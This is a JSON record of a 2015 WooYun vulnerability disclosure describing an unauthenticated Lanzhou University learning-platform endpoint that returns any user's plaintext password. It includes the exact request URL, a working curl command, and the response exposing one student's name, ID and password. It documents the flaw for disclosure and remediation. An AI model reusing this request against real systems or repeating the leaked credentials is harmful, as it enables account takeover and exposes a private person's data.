{"id": 27386, "wybug_id": "wooyun-2015-0125883", "wybug_title": "兰大学习平台漏洞致可获取任意用户密码", "wybug_corp": "兰大", "wybug_author": "Menci", "wybug_date": "2015-07-10 17:29", "wybug_open_date": "2015-08-27 10:38", "wybug_type": "账户体系控制不严", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误", "认证设计不合理", "敏感功能直接对外", "认证缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-27：\t细节向公众公开  简要描述： 通过兰大学习平台的某接口，可在未经过验证的情况下，轻易查询到任意用户的密码。 详细说明：  访问兰大学习平台用户信息接口：http://manage.dec.lzu.cn/StudentPortXML/UIStudentAndLearningAdmin_AJAX.aspx?Url=MakeXMLForStudentBaseInfo&UserName=用户名可在所得 XML 页面中获取到该用户的密码。此操作不需要任何登录，无需 Cookies ，没有经过任何验证。   漏洞证明：  在控制台上使用 cURL 工具进行提交，结果如下：Menci@MenciPC:~$ curl 'http://manage.dec.lzu.cn/StudentPortXML/UIStudentAndLearningAdmin_AJAX.aspx?Url=MakeXMLForStudentBaseInfo&UserName=txy19920212'<?xml version=\"1.0\" encoding=\"gb2312\"?><doc><StudentCertificateID>140362303200054</StudentCertificateID><SubjectName>护理学</SubjectName><StudentName>田小艳</StudentName><StationID>249</StationID><StudentFileStatus>1</StudentFileStatus><Password>19920212txy</Password><StudyLevelName>专科起点本科</StudyLevelName><Return>0</Return></doc>使用浏览器访问结果截图：\n\n 可见， XML 的 doc.Password 字段中即为用户密码，此密码可在 http://manage.dec.lzu.cn/Student_new/login.asp 中成功登陆。   修复方案：  在 http://manage.dec.lzu.cn/StudentPortXML/UIStudentAndLearningAdmin_AJAX.aspx 接口中对当前登录的用户进行验证，只允许获取当前用户的相关信息。   版权声明：转载请注明来源 Menci@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2015-07-13 10:37 厂商回复： 已通知相关学校处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}